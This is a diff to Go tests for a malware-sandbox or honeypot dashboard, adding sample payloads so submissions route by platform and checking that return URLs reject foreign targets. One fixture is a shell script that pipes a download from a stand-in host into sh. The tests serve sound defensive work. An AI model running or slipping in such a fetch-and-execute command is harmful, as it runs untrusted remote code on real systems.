@@ -10,10 +10,20 @@ import (
 	"testing"
 )
 
+// linuxSample is classified as a POSIX shell script: Linux platform, dynamic,
+// so it exercises the pre-existing spool. Bodies matter now that submission
+// routes on content.
+const linuxSample = "#!/bin/sh\ncurl http://198.51.100.7/x | sh\n"
+
+// windowsSample is the smallest byte sequence classifyPayload calls a Windows
+// PE. pe.NewFile rejects it, which is the DOS-stub-only fallback branch, and
+// that branch is still Windows and still dynamic.
+const windowsSample = "MZ\x90\x00this is not a parseable PE, only a DOS stub"
+
 func TestSandboxSubmitWritesOnlyValidatedExistingHash(t *testing.T) {
 	payloads, requests := t.TempDir(), t.TempDir()
 	hash := strings.Repeat("a", 64)
-	if err := os.WriteFile(filepath.Join(payloads, hash), []byte("sample"), 0o600); err != nil {
+	if err := os.WriteFile(filepath.Join(payloads, hash), []byte(linuxSample), 0o600); err != nil {
 		t.Fatal(err)
 	}
 	t.Setenv("DASHBOARD_REQUIRE_ADMIN", "true")
@@ -37,7 +47,7 @@ func TestSandboxSubmitWritesOnlyValidatedExistingHash(t *testing.T) {
 func TestSandboxSubmitReturnsToTheInitiatingRun(t *testing.T) {
 	payloads, requests := t.TempDir(), t.TempDir()
 	hash := strings.Repeat("c", 64)
-	if err := os.WriteFile(filepath.Join(payloads, hash), []byte("sample"), 0o600); err != nil {
+	if err := os.WriteFile(filepath.Join(payloads, hash), []byte(linuxSample), 0o600); err != nil {
 		t.Fatal(err)
 	}
 	t.Setenv("DASHBOARD_REQUIRE_ADMIN", "true")
@@ -64,7 +74,7 @@ func TestSandboxSubmitReturnsToTheInitiatingRun(t *testing.T) {
 // route outside the sandbox/payload surfaces.
 func TestSubmitReturnURLRejectsForeignTargets(t *testing.T) {
 	hash := strings.Repeat("d", 64)
-	fallback := "/payloads?analysis=queued&hash=" + hash
+	fallback := "/payloads?analysis=queued&hash=" + hash + "&target=windows"
 	for _, raw := range []string{
 		"", "   ",
 		"https://evil.example/sandbox/x",
@@ -73,13 +83,16 @@ func TestSubmitReturnURLRejectsForeignTargets(t *testing.T) {
 		"/events?ip=1.2.3.4",
 		"http://honeypot.example/payloads",
 	} {
-		if got := submitReturnURL(raw, hash); got != fallback {
+		if got := submitReturnURL(raw, hash, targetWindows); got != fallback {
 			t.Fatalf("submitReturnURL(%q) = %q, want the payload inventory fallback", raw, got)
 		}
 	}
-	got := submitReturnURL("/payload-analysis/"+hash+"#top", hash)
+	got := submitReturnURL("/payload-analysis/"+hash+"#top", hash, targetLinux)
 	if strings.Contains(got, "#") || !strings.HasPrefix(got, "/payload-analysis/"+hash+"?") {
 		t.Fatalf("submitReturnURL kept an unexpected shape: %q", got)
+	}
+	if !strings.Contains(got, "target=linux") {
+		t.Fatalf("submitReturnURL dropped the chosen backend: %q", got)
 	}
 }
 
